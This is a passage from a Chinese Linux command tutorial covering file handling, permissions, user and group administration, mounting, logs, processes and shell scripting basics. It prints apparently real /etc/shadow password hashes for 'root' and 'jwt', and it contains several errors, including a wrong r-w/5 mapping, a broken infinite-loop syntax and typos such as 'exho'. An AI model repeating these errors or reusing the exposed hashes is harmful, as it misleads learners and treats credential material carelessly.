列出文件内容符合指定的范本样式的文件名称。\n-L 列出文件内容不符合指定的范本样式的文件名称。\n-n 在显示符合范本样式的那一列之前，标示出该列的编号。\n-q 不显示任何信息。\n-R/-r 此参数的效果和指定“-d recurse”参数相同。\n-s 不显示错误信息。\n-v 反转查找。\n-w 只显示全字符合的列。\n-x 只显示全列符合的列。\n-y 此参数效果跟“-i”相同。\n-o 只输出文件中匹配到的部分。\n```\n\n```bash\n#查询cpuinfo信息合并输入一条\ngrep name /proc/cpuinfo | uniq     uniq:合并\n\n#查询cpuinfo信息合并输入一条并只输出:后的\ncat /proc/cpuinfo | grep name |cut -f2 -d \":\" |uniq\n# -f2 显示第二列的内容；-d \":\" 以:为分隔符\n\n#查询cpuinfo信息合并输入第3列\ncat /proc/cpuinfo |grep name | awk '{print $3}'\n\ncat /proc/meminfo |grep MemTotal | awk '{print $2/1024}'\n```\n\n### 文件的操作命令（增删改查）\n\n```bash\n1 touch 文件名称: 文件的创建（增）\n\n2 cat/more/less/tail文件名称  文件的查看（查）\n\n   cat：只能显示最后一屏内容\n\n more：可以显示百分比，回车可以向下一行， 空格可以向下一页，q可以退出查看\n\n less：可以使用键盘上的PgUp和PgDn向上 和向下翻页，q结束查看\n\n tail-10 ：查看文件的后10行，Ctrl+C结束\n\n注意：命令 tail -f 文件 可以对某个文件进行动态监控，例如tomcat的日志文件， 会随着程序的运行，日志会变化，可以使用tail -f catalina-2016-11-11.log 监控 文 件的变化\n\n3 vim 文件：修改文件的内容（改）\n\nvim编辑器是Linux中的强大组件，是vi编辑器的加强版，vim编辑器的命令和快捷方式有很多，但此处不一一阐述，大家也无需研究的很透彻，使用vim编辑修改文件的方式基本会使用就可以了。 \n\n在实际开发中，使用vim编辑器主要作用就是修改配置文件，下面是一般步骤： \n\nvim 文件------>进入文件----->命令模式------>按i进入编辑模式----->编辑文件 ------->按Esc进入底行模式----->输入:wq/q! （输入wq代表写入内容并退出，即保存；输入q!代表强制退出不保存。）\n\n4 rm -rf 文件：删除文件（删）同目录删除：熟记 rm -rf文件 即可\n    -p 递归删除空目录 -f 强制删除 -r 递归 -i 询问\n\n```\n### 压缩文件的操作命令\n\n```bash\n1）打包并压缩文件：\n\nLinux中的打包文件一般是以.tar结尾的，压缩的命令一般是以.gz结尾的。\n\n而一般情况下打包和压缩是一起进行的，打包并压缩后的文件的后缀名一般.tar.gz。命令：tar -zcvf 打包压缩后的文件名 要打包压缩的文件,其中：\n\nz：调用gzip压缩命令进行压缩\n\nc：打包文件\n\nv：显示运行过程\n\nf：指定文件名\n\n比如：加入test目录下有三个文件分别是 :aaa.txt bbb.txt ccc.txt,如果我们要打包test目录并指定压缩后的压缩包名称为test.tar.gz可以使用命令：tar -zcvf test.tar.gz aaa.txt bbb.txt ccc.txt或：tar -zcvf test.tar.gz /test/\n\n2）解压压缩包：\n\n命令：tar [-xvf] 压缩文件\n\n其中：x：代表解压\n\n示例：\n\n1 将/test下的test.tar.gz解压到当前目录下可以使用命令：tar -xvf test.tar.gz\n\n2 将/test下的test.tar.gz解压到根目录/usr下:tar -xvf xxx.tar.gz -C /usr(-C代表指定解压的位置）\n```\n\n## 文件权限命令\n\n操作系统中每个文件都拥有特定的权限、所属用户和所属组。权限是操作系统用来限制资源访问的机制，在Linux中权限一般分为读(readable)、写(writable)和执行(excutable)，分为三组。分别对应文件的属主(owner)，属组(group)和其他用户(other)，通过这样的机制来限制哪些用户、哪些组可以对特定的文件进行什么样的操作。通过 ·ls -l· 命令我们可以 查看某个目录下的文件或目录的权限\n\n示例：在随意某个目录下ls -l\n![](https://i.loli.net/2019/07/26/5d3ac443b1b1f34567.png)\n第一列的内容的解释信息如下：\n![](https://i.loli.net/2019/07/26/5d3ac4062d35135223.png)\n\n下面将详细讲解文件的类型、Linux中权限以及文件有所有者、所在组、其它组具体是什么？\n\n**文件的类型**：\n\n```bash\n•d：代表目录\n•-：代表文件\n•l：代表链接（可以认为是window中的快捷方式）\n```\n**Linux中权限分为以下几种**：\n\n```bash\n•r：代表权限是可读，r也可以用数字4表示\n•w：代表权限是可写，w也可以用数字2表示\n•x：代表权限是可执行，x也可以用数字1表示\n```\n**文件和目录权限的区别**：\n\n对文件和目录而言，读写执行表示不同的意义。\n\n对于文件：\n![](https://i.loli.net/2019/07/26/5d3ac5277a41331143.png)\n\n对于目录：\n![](https://i.loli.net/2019/07/26/5d3ac53f2976858167.png)\n\n\n\n>在linux中的每个用户必须属于一个组，不能独立于组外。在linux中每个文件有所有者、所在组、其它组的概念。\n\n* 所有者\n\n一般为文件的创建者，谁创建了该文件，就天然的成为该文件的所有者，用ls ‐ahl命令可以看到文件的所有者 也可以使用chown 用户名 文件名来修改文件的所有者 。\n\n* 文件所在组\n\n当某个用户创建了一个文件后，这个文件的所在组就是该用户所在的组 用ls ‐ahl命令可以看到文件的所有组 也可以使用chgrp 组名 文件名来修改文件所在的组。\n\n* 其它组\n\n除开文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组\n\n**如何修改文件/目录的权限**\n\n修改文件/目录的权限的命令：chmod\n格式：[ugoa...][[+-=][rwxX]...][,...]\n\n```bash\nu表示拥有者（user）\ng表示与拥有者属于同组group）\no表示其它用户（other）\na表示这三者皆是。(all)\n```\n```bash\n+表示添加权限，-表示取消权限。=表示唯一设定权限。\n\nr：表示可读取，w表示可写入，x表示可运行。\n```\n示例：修改/test下的aaa.txt的权限为属主有全部权限，属主所在的组有读写权限， 其他用户只有读的权限\n\n```chmod u=rwx,g=rw,o=r aaa.txt```\n![](https://i.loli.net/2019/07/26/5d3ac6193b4d871854.png)\n上述示例还可以使用数字表示：\n\n```chmod 764 aaa.txt```\n**使用数字设置权限**：\n语法：chmod abc file\n\n当中a,b,c各为一个数字，a表示User，b表示Group。c表示Other的权限。\n```bash\nr=4，w=2。x=1\n\n若要rwx（可读、可写、可运行）属性，则4+2+1=7\n\n若要rw-（可读、可写、不可运行）属性，则4+2=6\n\n若要r-w（可读、不可写、可运行）属性，则4+1=5\n```\n示例：\n```bash\nchmod a=rwx file 和 chmod 777 file 效果同样\n\nchmod ug=rwx,o=x file 和 chmod 771 file 效果同样\n\n若用chmod 4755 filename可使此程式具有root的权限\n```\n**注意：文件夹要有x权限才可以访问，只有r不可以访问**\n\n**补充一个比较常用的东西**:\n\n假如我们装了一个zookeeper，我们每次开机到要求其自动启动该怎么办？\n\n1.新建一个脚本zookeeper\n2.为新建的脚本zookeeper添加可执行权限，命令是:chmod +x zookeeper\n3.把zookeeper这个脚本添加到开机启动项里面，命令是：chkconfig --add zookeeper\n4.如果想看看是否添加成功，命令是：chkconfig --list\n\n## 用户管理\n\nLinux系统是一个多用户多任务的分时操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统。\n\n用户的账号一方面可以帮助系统管理员对使用系统的用户进行跟踪，并控制他们对系统资源的访问；另一方面也可以帮助用户组织文件，并为用户提供安全性保护。\n\n#### 用户管理的几个系统配置文件\n\n1.   **/etc/passwd**：**存放关于账户相关的信息**\n\n   ![](https://i.loli.net/2020/03/30/icPxY4WV7d69pjg.png)\n\n2.  **etc/shadow：/etc/passwd的影子文件**\n\n   ```bash\n   root:$6$/LWuDRno$roPA0L5ZR.gsfLmCWKqNnE2F3oePaaqvHlF2O07oM9tzDzBlyyC62gS6VxKpc/eKGz/UaypXCtfltmQ7d7/7b1:18314:0:99999:7:::\n   ```\n   | **字段名**   | **编号** | **说明**                                            |\n   | ------------ | -------- | --------------------------------------------------- |\n   | **username** | **1**    | **root**                                            |\n   | **password** | **2**    | **加密口令：$6$/LWuDRno$roPA0L5ZR.gs.../7b1**       |\n   | **lastchg**  | **3**    | **自1970.1.1起到上次修改口令所经过的天数：17431天** |\n   | **min**      | **4**    | **需几天可以修改口令：0天**                         |\n   | **max**      | **5**    | **口令还会有效的最大天数：99999天，即永不过期**     |\n   | **warn**     | **6**    | **口令失效前7天内向用户发出警告**                   |\n   | **inactive** | **7**    | **禁止登录前用户还有效的天数未定义，以“：”表示**    |\n   | **expire**   | **8**    | **用户被禁止登录的时间未定义，以“：”表示**          |\n   | **flag**     | **9**    | **保留未使用，以“：”表示**                          |\n\n```bash\njwt:$6$VtVD9Veq$B2YcOYK6qE96wiWNMq45N4pGB.3/UdSzTBmdyizB3YADRjbE5HbaBOhw5JxpDWCH.b/Bj3MBQSB8Y8zqLFjef1:18314:0:99999:7:::\n```\n![](https://i.loli.net/2020/03/30/e8WmFto13ATRDpL.png)\n\n| **字段名** | **编号** | **说明**                                   |\n| ---------- | -------- | ------------------------------------------ |\n| username   | **1**    | **用户的登录名**                           |\n| password   | **2**    | **加密的用户密码**                         |\n| lastchg    | **3**    | **自1970.1.1起到上次修改口令所经过的天数** |\n| min        | **4**    | **两次修改口令之间至少经过的天数**         |\n| max        | **5**    | **口令还会有效的最大天数**                 |\n| warn       | **6**    | **口令失效前多少天内向用户发出警告**       |\n| inactive   | **7**    | **禁止登录前用户还有效的天数**             |\n| expire     | **8**    | **用户被禁止登录的时间**                   |\n| flag       | **9**    | **保留**                                   |\n\n3. **/etc/group文件:存放用户组相关的信息资料**\n\n```bash\nroot:x:0:\n\njwt:x:1000:\n```\n\n| 字段名         | 编号  | 说明                   |\n| -------------- | ----- | ---------------------- |\n| group_name     | **1** | **用户组名**           |\n| group_password | **2** | **加密后的用户组密码** |\n| group_id       | **3** | **用户组ID**           |\n| group_members  | **4** | **逗号分隔开的组成员** |\n\n 4.**etc/gshadow:为了保护用户组的加密密码，防止暴力破解**\n\n```bash\nroot:*::\n\njwt:!::\n```\n\n| 字段名         | 编号  | 说明                               |\n| -------------- | ----- | ---------------------------------- |\n| group_name     | **1** | **用户组名**                       |\n| group_password | **2** | **加密后的用户组密码**             |\n| group_id       | **3** | **用户组ID（可以为空）**           |\n| group_members  | **4** | **逗号分隔开的组成员（可以为空）** |\n\n`！`表示组没有设置密码，可以用`gpasswd`命令给组设置密码\n\n#### 添加用户\n\n```bash\nuseradd 选项 用户名   #创建新用户\n#注意：使用useradd命令添加用户后，如果不使用passwd命令为用户设置密码，此用户将无法登录。\n\nadduser 选项 用户名   #添加用户\n```\n**useradd命令常用选项：**\n\n| **选项** | **作用**                                                     |\n| -------- | ------------------------------------------------------------ |\n| **-d**   | **指定用户主目录。如果此目录不存在，则同时使用-m选项，可以创建主目录。** |\n| **-g**   | **指定gid**                                                  |\n| **-u**   | **指定uid**                                                  |\n| **-G**   | **指定用户所属的附加组。**                                   |\n| **-l**   | **不要把用户添加到lastlog和failog中，这个用户的登录记录不需要记载** |\n| **-M**   | **不要建立用户主目录**                                       |\n| **-m**   | **自动创建用户主目录**                                       |\n| **-p**   | **指定新用户的密码**                                         |\n| **-r**   | **建立一个系统帐号**                                         |\n| **-s**   | **指定shell**                                                |\n\nuseradd命令用于Linux中创建的新的系统用户。useradd可用来建立用户帐号。帐号建好之后，再用passwd设定帐号的密码．而可用userdel删除帐号。`使用useradd指令所建立的帐号，实际上是保存在/etc/passwd文本文件中。` `使用adduser指令所建立的帐号，会在home目录下产生工作目录.`\n\n#### 修改密码\n\n```bash\npasswd 用户名        #更改或创建用户的密码\nsudo passwd root    #为root设置密码\n\npasswd -S 用户名     #显示用户账号密码信息\n\npasswd -d 用户名     #清除用户密码\n```\n\n**passwd命令常用选项：**\n\n| 选项   | 作用                                                     |\n| ------ | -------------------------------------------------------- |\n| **-l** | **管理员通过锁定口令来锁定已经命名的账户，即禁用该用户** |\n| **-u** | **管理员解开账户锁定状态**                               |\n| **-x** | **管理员设置最大密码使用时间（天）**                     |\n| **-n** | **管理员设置最小密码使用时间（天）**                     |\n| **-d** | **管理员删除用户的密码**                                 |\n| **–f** | **强迫用户下次登录时修改口令**                           |\n\npasswd命令用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。\n\n#### 修改用户属性\n\n```bash\nusermod 选项 用户名   #改变用户属性\n```\n\n**usermod命令常用选项:**\n\n| **选项** | **作用**                               |\n| -------- | -------------------------------------- |\n| **-d**   | **修改用户主目录**                     |\n| **-e**   | **修改帐号的有效期限**                 |\n| **-f**   | **修改在密码过期后多少天即关闭该帐号** |\n| **-g**   | **修改用户所属的组**                   |\n| **-G**   | **修改用户所属的附加组**               |\n| **-l**   | **修改用户帐号名称**                   |\n| **-L**   | **锁定用户密码，使密码无效**           |\n| **-s**   | **修改用户登入后所使用的shell**        |\n| **-u**   | **修改用户ID**                         |\n| **-U**   | **解除密码锁定**                       |\n\n#### 删除用户\n\n```bash\nuserdel 选项 用户名   #删除用户帐号\n\nuserdel  test4         删除用户test4，保留主目录\nuserdel  test5  -r     删除用户test5及其主目录\n```\n\n## 用户组管理\n\n每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。不同Linux 系统对用户组的规定有所不同，如Linux下的用户属于与它同名的用户组，这个用户组在创建用户时同时创建。\n\n用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对/etc/group文件的更新。\n\n**系统用户组的管理相关命令**:\n\n#### 增加组\n\n```bash\ngroupadd 选项 组名 \n\ngroupadd -g 343 newgroup\n#新建一个ID为343的组\n```\n\n**groupadd命令的常用选项**\n\n| **选项** | **作用**                                         |\n| -------- | ------------------------------------------------ |\n| **–g**   | **指定组ID号，除非使用-o选项，否则该值必须唯一** |\n| **–o**   | **允许设置相同组id的群组，不必唯一**             |\n| **–r**   | **建立系统组账号，即组ID低于499**                |\n| **–f**   | **强制执行，创建相同id的组**                     |\n\n#### 更改组属性\n\n```bash\ngroupmod 选项 组名\n\ngroupmod -n linux newgroup\n#将newgroup群组的名称改为linux\n```\n**groupmod命令的常用选项**\n\n| **选项** | **作用**                               |\n| -------- | -------------------------------------- |\n| **–g**   | **指定组ID号**                         |\n| **–o**   | **与groupadd相同，重复使用群组识别码** |\n| **–n**   | **修改用户组名**                       |\n\n#### 删除组\n\n```bash\ngroupdel 组名 \n\ngroupdel  linux\n#删除linux组 如果组里面有用户，那么需要先删除用户，再删除组。      \n```\n\n#### 添加用户入组\n\n```bash\nsudo gpasswd -M user1,user2  group  \n#为group组指定user1和user2组成员\n```\n\n#### 删除组中用户\n\n```bash\ngpasswd -d test4 sudo\n#将组sudo中的用户test4删除\n```\n\n## 用户权限\n\n> 第一个用户默认有sudo权限\n\n两种方法让普通用户具有sudo 的权限：\n\n- 修改配置文件(/etc/sudoers)把用户加到sudo组\n\n```bash\nsudo gedit /etc/sudoers\n\n#在文件此处添加你要加的用户\n# Allow members of group sudo to execute any command\n%sudo\tALL=(ALL:ALL) ALL\njwt     ALL=(ALL:ALL) ALL  #将jwt用户加进去了\n```\n\n- 使用命令把用户加到sudo组\n\n```bash\n#方法一\nsudo usermod  -G  sudo  jwt  #添加用户jwt进入组sudo\n\n#方法二\nsudo gpasswd -a jwt  sudo    #添加用户jwt进入组sudo\n```\n\n## 设备管理\n\n#### 基础命令\n\n```bash\nfdisk -l #磁盘及分区管理工具，在硬盘设备中创建、删除、更改分区等操作通过fdisk命令进行\n\nmkfs #将硬盘分区后，使用mkfs（Make Filesystem，创建文件系统）命令可对其进行格式化。\n# mkfs  -t  ext3  /dev/hdb1\n\nfsck #扫描磁盘问题\n\ndf #命令功能是检查文件系统的磁盘空间占用情况。\n\ndu #统计目录（或文件）所占磁盘空间的大小。-a显示每个子文件的磁盘占用量 -s 统计总磁盘占用量\n# du -a /home/user/dir\n\nquota #命令可以显示磁盘已使用的空间与限制\n\nmount #命令可以实现对存储设备的挂载\nmount -t \n示例：挂载u盘设备（假设u盘标识为sdb1）到/mnt/usb目录。\n#mount  /dev/sdb1  /mnt/usb\n```\n\n### 使用cifs在Linux上挂载Windows共享\n\n#### **方法一**：使用命令进行挂载\n\n1.查看Windows的IP:**ipconfig**，我的ip是192.168.137.1\n\n2.在Windows上建立共享文件\n\n![](https://i.loli.net/2020/04/21/78HuMbGZnemYV2q.png)\n\n3.在linux上新建要挂载到的文件夹 我是建在`~/Win-Share`\n\n4.在linux上执行挂载语句\n\n```bash\nsudo mount -t cifs -o username='Win用户名',password='登录密码',uid=jwt,gid=jwt //192.168.137.1/Ubuntu-Share/ ~/Win-Share\n\n\n# username,password是windows登录用户名密码，一定不能输错。\n# //192.168.137.1/Ubuntu-Share/ 就是windows要的共享文件夹\n# ~/Win-Share是linux将共享文件夹要挂载到的地方，可任意定位置\n# uid和gid也可以不要，uid和gid查看方法：命令行执行\"id\"命令\n\nsudo apt install cifs-utils #没有cifs执行这个命令安装\nsudo mount -t c(table) #查看是否有cifs\n```\n\n5.取消挂载\n\n```bash\nsudo umount ~/Win-Share\n```\n\n6.查看挂载信息\n\n```bash\n$ mount | grep Win-Share\n//192.168.137.1/Ubuntu-Share/ on /home/jwt/Win-Share type cifs (rw,relatime,vers=default,cache=strict,username=admin,domain=,uid=0,noforceuid,gid=0,noforcegid,addr=192.168.137.1,file_mode=0755,dir_mode=0755,soft,nounix,serverino,mapposix,rsize=1048576,wsize=1048576,echo_interval=60,actimeo=1)\n```\n\n#### 挂载时遇见的错误\n\n我执行时遇到了`无法以只读方式挂载`的错误，排查之后是我的用户名错了\n\n![](https://i.loli.net/2020/04/21/tuOR845TNiShLCf.png)\n\n查看Win用户`net user`,我开始使用Administrator，一直报错，换成admin成功了，所以用户名和密码一定不要输错了\n\n![](https://i.loli.net/2020/04/21/KUmtpdRrTvs9F7k.png)\n\n#### 方法二：手动挂载\n\n打开文件，点击其他位置，在连接到服务输入`smb://ip/win共享文件夹`,点击连接输入win用户名和密码\n\n```\nsmb://192.168.137.1/ubuntu-share/\n```\n\n![](https://i.loli.net/2020/04/21/D7KCcizMoEIYVsx.png)\n\n### 挂载光盘文件 iso\n\n1.\t制作光盘镜像文件\n2.\t挂载该文件\n\n```bash\n#流程\n1.\t将文件和目录制作成光盘镜像文件，执行下面的命令。\n#mkisofs -r -J -V tt  -o ~/Desktop/tt.iso ~/Desktop/exam\n2.\t将新的光盘镜像加载\nsudo mount -t iso9660 -o loop ~/Desktop/tt.iso  ~/Desktop/tTest\n```\n\n### 综合案例\n\n> 新增加一个磁盘，对磁盘进行分区，格式化分区，挂载分区，并给该磁盘进行配额。指定用户限额流程：\n\n流程：\n1.\t虚拟机 -->设置-->添加磁盘  重启Ubuntu （模拟服务器接了一个新硬盘）\n2.\t查看分区信息，虚拟机新建分区\n3.\tdfisk 进行分区\n4.\t格式化新分区\n5.\t新建挂载点  sudo mkdir /home/newdisk\n6.\t将分区挂载到 挂载点 sudo mount /dev/sdb1  /home/newDisk.\n\n配额设置：\n\n1.\tmount 将磁盘重新挂载到用户配额和组配额 sudo mount -o remount,usrquota,grpquota  /home/newDisk\n2.\t检查是否挂载到配额 mount | grep sdb1\n3.\t查看配额信息  quatocheck -avug\n4.\t开启配额 （服务） sudo quotaon -vug  /home/newDisk\n5.\t给用户分配配额。 Sudo edquota -u zj    Ctrl + O, ctrl+m ,ctrl+x\n6.\t给组分配陪  Sudo edquota -g zj   (硬限制>软限制）\n7.\t 查看配额 sudo quota -uvs zj\n8.\t测试\n\n## 日志管理\n\n> 日志文件所处的位置都在**/var/log**目录下\n\n```bash\nalternatives.log   -更新替代信息都记录在这个文件中\nkern.log    –包含内核产生的日志，有助于在定制内核时解决问题。\napport.log  -应用程序崩溃记录\napt/  用apt-get安装卸载软件的信息\nauth.log  -登录认证log\nboot.log  -包含系统启动时的日志。\nwtmp  —包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。\nbtmp    -记录所有失败启动信息\ndist-upgrade  -dist-upgrade更新方式的信息\ndpkg.log   - 包括安装或dpkg命令清除软件包的日志。\nfontconfig.log -与字体配置有关的log。\nlastlog —记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。\nfaillog –包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。\n```\n\nLinux系统中的有三个主要的日志子系统\n\n1.连接时间日志子系统 utmp、wtmp和lastlog\n\n2.进程统计日志子系统\n\n3.错误日志子系统\n\n**less  --主要用来查看日志**\n\n```bash\nG:跳转到末尾\n/字符串：向下搜索\"字符串\"的功能\n?字符串：向上搜索\"字符串\"的功能\nn：重复前一个搜索（与 / 或 ? 有关）\nN：反向重复前一个搜索（与 / 或 ? 有关）\nq: 退出\n空格键 滚动一页\n回车键 滚动一行\n```\n\n**free** 内存查看命令 \n\n**Lastcomm** 可以监测系统中任何时候执行的命令\n\n## 进程管理\n\n```bash\n#查看进程\nps  静态的\ntop 动态的\n```\n\nps-显示当前进程的状态\n\n```bash\nps -l  #将目前属于您自己这次登入的 PID 与相关信息列示出来，长格式显示更加详细的信息；\nps -a  #显示一个终端的所有进程，除会话引线外； tty:终端\nps -A  #显示所有进程信息\nps –u root #指定用户的所有进程信息\nps -e  #显示所有进程信息\n\nps aux ##查看系统中所有的进程显示所有包含其他使用者的行程\nps -axjf #以程序树的方式显示\nps -eLf #显示线程信息\nps -a | wc -l #统计行数\nps -ef | grep queue | grep -v grep | wc -l #查找含有queue关键词的进程（-v去掉grep本身），输出找到的进程数量。\nps -aux | awk '$2~/S/ {print $0}' #统计sleep状态的进程\n#统计终端为tty1的所有进程\nps aux | awk '$7~/tty1/' | wc -l   #$7表示tty在ps aux 数据的第7列 #  ~/tty1/ 表示包含tty1的\n\n```\n\n## 查看系统信息命令\n\n````bash\nuname -a # 查看内核/操作系统/CPU信息 \nhead -n 1 /etc/issue # 查看操作系统版本 \ncat /proc/cpuinfo # 查看CPU信息 \nhostname # 查看计算机名 \nlspci -tv # 列出所有PCI设备 \nlsusb -tv # 列出所有USB设备 \nlsmod # 列出加载的内核模块 \nenv # 查看环境变量资源 \nfree -m # 查看内存使用量和交换区使用量 \ndf -h # 查看各分区使用情况 \ndu -sh <目录名> # 查看指定目录的大小 \ngrep MemTotal /proc/meminfo # 查看内存总量 \ngrep MemFree /proc/meminfo # 查看空闲内存量 \nuptime # 查看系统运行时间、用户数、负载 \ncat /proc/loadavg # 查看系统负载磁盘和分区 \nmount | column -t # 查看挂接的分区状态 \nfdisk -l # 查看所有分区 \nswapon -s # 查看所有交换分区 \nhdparm -i /dev/hda # 查看磁盘参数(仅适用于IDE设备) \ndmesg | grep IDE # 查看启动时IDE设备检测状况网络 \nifconfig # 查看所有网络接口的属性 \niptables -L # 查看防火墙设置 \nroute -n # 查看路由表 \nnetstat -lntp # 查看所有监听端口 \nnetstat -antp # 查看所有已经建立的连接 \nnetstat -s # 查看网络统计信息进程 \nps -ef # 查看所有进程 \ntop # 实时显示进程状态用户 \nw # 查看活动用户 \nid <用户名> # 查看指定用户信息 \nlast # 查看用户登录日志 \ncut -d: -f1 /etc/passwd # 查看系统所有用户 \ncut -d: -f1 /etc/group # 查看系统所有组 \ncrontab -l # 查看当前用户的计划任务服务 \nchkconfig –list # 列出所有系统服务 \nchkconfig –list | grep on # 列出所有启动的系统服务程序 \nrpm -qa # 查看所有安装的软件包\n````\n\n## 其他常用命令\n\n```bash\npwd：显示当前所在位置\n\nuname -a 查看内核/操作系统/CPU信息\n\ngrep 要搜索的字符串 要搜索的文件 --color：搜索命令，--color代表高亮显示\n\nps -ef/ps aux：这两个命令都是查看当前系统正在运行进程，两者的区别是展示格式不同。如果想要查看特定的进程可以使用这样的格式：ps aux|grep redis（查看包括redis字符串的进程）\n\n注意：如果直接用ps（（Process Status））命令，会显示所有进程的状态，通常结合grep命令查看某进程的状态。\n\nkill -9 进程的pid：杀死进程（-9 表示强制终止。）\n\n先用ps查找进程，然后用kill杀掉\n```\n**网络通信命令**：\n\n```bash\n查看当前系统的网卡信息：ifconfig\n\n查看与某台机器的连接情况：ping\n\n查看当前系统的端口使用：netstat -an\n\nshutdown：\n\nshutdown -h now：指定现在立即关机\n\nshutdown +5 \"System will shutdown after 5 minutes\":指定5分钟后关机，同时送出警告信息给登入用户。\n\nreboot：重启。\n\nreboot -w：做个重开机的模拟（只有纪录并不会真的重开机）。\n\ngnome-session-quit：注销\n\nlogout:注销（纯命令模式下）\n```\n\n## 文本处理三剑客--grep、sed、awk\n\n请看我另外一篇文章：https://jwt1399.top/posts/22718.html\n\n## Linux下Shell编程\n\n```shell\n#!/bin/bash\necho \"开始学习shell !\"\n```\n\n`#!`(Shebang) 告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。\n\n### 运行方法\n\n```bash\nchmod +x ./test.sh  #使脚本具有执行权限\n./test.sh  #执行脚本\n```\n\n### 文件表达式\n\n```shell\n-e filename 如果 filename存在，则为真\n-d filename 如果 filename为目录，则为真 \n-f filename 如果 filename为常规文件，则为真\n-L filename 如果 filename为符号链接，则为真\n-r filename 如果 filename可读，则为真 \n-w filename 如果 filename可写，则为真 \n-x filename 如果 filename可执行，则为真\n-s filename 如果文件长度不为0，则为真\n-h filename 如果文件是软链接，则为真\nfilename1 -nt filename2 如果 filename1比 filename2新，则为真。\nfilename1 -ot filename2 如果 filename1比 filename2旧，则为真。\n```\n\n### 整数变量表达式\n\n```shell\n-eq 等于\n-ne 不等于\n-gt 大于\n-ge 大于等于\n-lt 小于\n-le 小于等于\n```\n\n**test 命令**\n\n> shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。\n\n```shell\nnum1=100\nnum2=100\nif test $[num1] -eq $[num2]\nthen\n    echo '两个数相等！'\nelse\n    echo '两个数不相等！'\nfi\n```\n\n\n\n### 字符串变量表达式\n\n```shell\nif  [ $a = $b ]                 如果string1等于string2，则为真,字符串允许使用赋值号做等号           if  [ $string1 !=  $string2 ]   如果string1不等于string2，则为真       \nif  [ -n $string  ]             如果string 非空(非0），返回0(true)  \nif  [ -z $string  ]             如果string 为空，则为真\nif  [ $sting ]                  如果string 非空，返回0 (和-n类似) \nif  [ ! 表达式 ]\t\t\t\t  逻辑非 !    条件表达式的相反\nif  [ ! -d $num ]               如果不存在目录$num\nif  [ 表达式1  –a  表达式2 ]      逻辑与 –a     条件表达式的并列\nif  [ 表达式1  –o 表达式2 ]       逻辑或 -o     条件表达式的或\n```\n\n### 特殊变量\n\n| $#   | 传递到脚本的参数个数                                         |\n| ---- | ------------------------------------------------------------ |\n| $*   | 以一个单字符串显示所有向脚本传递的参数。 如\"$*\"用「\"」括起来的情况、以\"$1 $2 … $n\"的形式输出所有参数。 |\n| $$   | 脚本运行的当前进程ID号                                       |\n| $!   | 后台运行的最后一个进程的ID号                                 |\n| $@   | 与$*相同，但是使用时加引号，并在引号中返回每个参数。 如\"$@\"用「\"」括起来的情况、以\"$1\" \"$2\" … \"$n\" 的形式输出所有参数。 |\n| $-   | 显示Shell使用的当前选项，与[set命令](https://www.runoob.com/linux/linux-comm-set.html)功能相同。 |\n| $?   | 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 |\n\n### Shell算术运算\n\n**1、expr expression**\n\n```sh\neg：expr  $a + $b\n```\n\n注意：在使用expr时，运算符前后要有空格，且乘法要用`\\`转义，即`\\*`的形式。\n\n**2、$((expression))**\n\n```shell\neg: $((a+b))\n```\n\n**3、let命令**\n\n```shell\neg: let c=a+b\n```\n\n### if语句\n\n```shell\nif condition1\nthen\n\tcommand1\nelif condition2\n\tcommand2\nelse\n\tcommandN\nfi\n```\n\n### for语句\n\n```shell\n#C风格的for\nfor var in item1 item2 ... itemN\ndo\n\tcommand1\n\tcommand2\n\t...\n\tcommandN\ndone\n```\n\n```shell\nfor (( EXP1; EXP2; EXP3 ))\ndo\n\tcommand1\n\tcommand2\n\tcommand3\ndone\n```\n\n**循环常见场景：**\n\n写成一行do前面要加分号\n\n```shell\n#1、有限数字（用空格隔开）\nfor i in 1 2 3 4 5;do echo $i ;done　\n\n#2、序列数据（seq 开始 步长 最后） ---步长默认1\nfor i in $(seq 1 3 100); do echo $i ;done\n\n#3、命令结果（默认空格为分隔符）\nfor i in `cat 01.txt`;do echo $i ;done\nfor i in `ls | grep \"heh\"`;do echo $i ;done\n\n#4、语法循环（类似C，注意为双括号,分号隔开）\nfor ((i=1;i<3;i+=2));do echo i ;done\nfor ((;;);do echo\"无限循环\";done\n\n```\n\n### while语句\n\n```shell\nwhile [ condition ]\ndo\n\tcommand\ndone\n```\n### until语句\n\nuntil语句与while语句一样，都是循环语句，但处理方式正好相反，即`当判断条件为真时，循环停止`。\n\n```shell\nuntil condition\ndo\n\tcommand\ndone\n```\n\n### case语句\n\ncase的语法和C family语言差别很大，它需要一个esac（就是case反过来）作为结束标记，每个case分支用右圆括号，用两个分号表示break\n\n```shell\n#!/bin/bash\necho \"please enter the number of the week:\"\nread number\ncase $number in\n 1) echo \"Monday\";;\n 2) echo \"Tuesday\";;\n 3) echo \"Wednsday\";;\n 4) echo \"Thursday\";;\n 5) echo \"Friday\";;\n 6) echo \"saturday\";;\n 7) echo \"Sunday\";;\n *) echo \"your enter must be in 1-7.\";;\nesac\n```\n\ncase支持合并匹配模式，即在每一个模式中，可以使用通配符或逻辑符号。\n\n```shell\n#! /bin/bash\necho \"please input score:\"\nread score\nlet score/=10\ncase $score in\n0|1|2|3|4|5) echo \"不及格\";;\n6) echo \"及格\";;\n7|8) echo \"良好\";;\n9|10) echo \"优秀\";;\n*) echo \"错误\";;\nesac\n```\n\n### Shell 函数\n\n```shell\n[ function ] funname [()]\n{\n    action;\n    [return int;]\n}\n```\n\n可以带function funname() 定义，也可以直接funname() 定义,不带任何参数。\n\n示例：\n\n```shell\nadd()\n{\n\techo \"input a:\"\n\tread a\n\techo \"input b:\"\n\tread b\n\techo -n \"a+b=\"\n\treturn $(($a+$b))\n}\nadd\nexho 